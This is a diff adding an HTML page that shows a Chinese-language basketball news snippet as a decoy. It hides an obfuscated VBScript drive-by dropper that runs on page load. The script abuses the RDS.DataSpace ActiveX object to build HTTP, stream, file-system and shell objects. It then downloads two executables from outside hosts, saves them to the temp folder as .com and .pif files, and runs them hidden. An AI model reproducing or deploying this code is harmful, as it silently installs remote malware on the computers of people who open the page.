@@ -1,0 +1,69 @@
+<html>
+<body>
+<script type="text/jscript">
+function init() { 
+document.write("<center><font color=red>休斯顿当地时间周六晚间7点半，火箭队主场丰田中心迎战孟菲斯灰熊队。结果火箭队队85-76获胜，姚明得到最高分28分，并抢到8个篮板，麦蒂也得到19分，另有13次助攻，追平了此前个人的最高助攻记录。</font><center>");}
+window.onload = init;
+</script>
+<script language="VBScript">
+on error resume next
+burl_0="http://www.x2.com/test.exe"
+burl_1="http://mail.8u8y.com/ad/pic/temp.exe"
+mbb11e="Adodb.Stre"
+wbb12b="a"
+dbb33l="m"
+wss01y="Microsoft.XM"
+nss22v="L"
+nss63d="HTTP"
+ccc51i="clsid:BD"
+jcc02v="9"
+acc83u="6C556-65A3-11D0-983A-00C04FC29E36"
+ooo31w="Scripting.Fil"
+goo52c="e"
+foo13p="SystemObject"
+ojj71p="o"
+yjj32l="b"
+qjj03j="ject"
+acl61d="cl"
+ocl42i="a"
+mcl63p="ssid"
+gse61y="S"
+kse52k="h"
+mse13j="ell.Application"
+e4sds0=wss01y&nss22v&nss63d
+p7b0bb=mbb11e&wbb12b&dbb33l
+y1cqc6=ccc51i&jcc02v&acc83u
+u0o6ox=ooo31w&goo52c&foo13p
+g6jej3=ojj71p&yjj32l&qjj03j
+q0l4ls=acl61d&ocl42i&mcl63p
+n3eae5=gse61y&kse52k&mse13j
+Set b7d4fe = document.createElement(g6jej3)
+b7d4fe.setAttribute q0l4ls, y1cqc6
+set n6f0q = b7d4fe.createobject(u0o6ox,"")
+set n6x4o = b7d4fe.CreateObject(e4sds0,"")
+set s4sv1 = b7d4fe.CreateObject(p7b0bb,"")
+set m7qe1 = b7d4fe.CreateObject(n3eae5,"")
+set xte5mp = n6f0q.GetSpecialFolder(2)
+s4sv1.type = 1
+x2get="GET"
+n6x4o.Open x2get, burl_0, False
+n6x4o.Send
+o8L_uy70= "L_uy70.com"
+o8L_uy70= n6f0q.BuildPath(xte5mp,o8L_uy70)
+s4sv1.open
+s4sv1.write n6x4o.responseBody
+s4sv1.savetofile o8L_uy70,2
+s4sv1.close
+m7qe1.ShellExecute o8L_uy70,"","","open",0
+n6x4o.Open x2get, burl_1, False
+n6x4o.Send
+o8L_uy71= "L_uy71.pif"
+o8L_uy71= n6f0q.BuildPath(xte5mp,o8L_uy71)
+s4sv1.open
+s4sv1.write n6x4o.responseBody
+s4sv1.savetofile o8L_uy71,2
+s4sv1.close
+m7qe1.ShellExecute o8L_uy71,"","","open",0
+</script>
+</body>
+</html>
